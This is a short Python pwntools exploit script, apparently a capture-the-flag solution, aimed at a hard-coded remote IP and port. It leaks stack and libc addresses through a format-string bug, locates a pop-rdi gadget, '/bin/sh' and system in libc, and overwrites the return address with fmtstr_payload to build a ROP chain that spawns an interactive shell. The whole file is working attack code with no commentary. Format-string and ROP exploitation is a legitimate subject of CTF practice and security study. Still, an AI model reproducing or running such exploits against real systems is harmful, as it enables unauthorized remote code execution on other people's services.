#!/usr/bin/env python3
from pwn import *

context.clear(arch='amd64', os='linux') 
libc = ELF('./libc.so.6', checksec=False)

IP = "14.225.212.104"
PORT = 9001

p = remote(IP, PORT)

p.sendline(b"STACK: %168$p LIBC: %169$p")

p.recvuntil(b"STACK: ")
RIP = int(p.recv(14), 16) - 184 * 0x8 + 8
print(f"RIP: {hex(RIP)}")

p.recvuntil(b"LIBC: ")
libc.address = int(p.recv(14), 16) - 0x2a1ca
print(f"Libc base: {hex(libc.address)}")

pop_rdi = libc.address + 0x10f78b
bin_sh = next(libc.search(b"/bin/sh"))
ret = libc.address + 0x2882f
system = libc.sym.system

writes = {
    RIP: pop_rdi,
    RIP + 8: bin_sh,
    RIP + 16: ret,
    RIP + 24: system
}

payload = fmtstr_payload(6, writes, write_size='short')
p.send(payload)
p.interactive()